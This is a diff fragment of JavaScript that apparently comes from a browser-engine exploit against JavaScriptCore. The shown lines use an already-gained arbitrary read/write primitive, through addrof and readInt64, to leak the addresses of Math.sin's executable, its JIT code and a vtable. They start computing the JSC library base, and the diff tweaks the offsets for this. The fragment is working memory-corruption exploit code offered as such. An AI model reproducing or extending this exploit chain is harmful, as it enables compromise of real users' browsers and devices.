@@ -634,16 +634,16 @@ for (var i = 0; i < 1000; ++i) {
     };
     print("we have arbitrary r/w with JSArray :)");
    memory = stage2;
-	var sinFuncAddr = memory.addrof(Math.sin);
+	var sinFuncAddr = addrof(Math.sin);
         print("Math.sin() @ " + sinFuncAddr);
-        var executableAddr = memory.readInt64(Add(sinFuncAddr, 32));
+        var executableAddr = memory.readInt64(Add(sinFuncAddr, 24));
         print("Math.sin() ExecutableAddr @ " + executableAddr);
-        var jitCodeAddr = memory.read64(Add(executableAddr, 32));
-	print("Math.sin() jitCodeAddr @ " + jitCodeAddr);
+        var jitCodeAddr = memory.readInt64(Add(executableAddr, 24));
+	print("Math.sin() NativeJITCodeAddr @ " + jitCodeAddr);
         
-        /*var vtab = memory.readInt64(jitCodeAddr);
+        var vtab = memory.readInt64(Add(jitCodeAddr,0));
         print("Math.sin() vtable @ " + vtab)
-        var anchor1 = memory.readInt64(vtab)
+        /*var anchor1 = memory.readInt64(vtab)
         print("anchor1" + anchor1);
         var jsc = Sub(anchor1, anchor1.lo() & 0xfff);
 	print('JSC header @' + jsc);  //dyld_cache_header
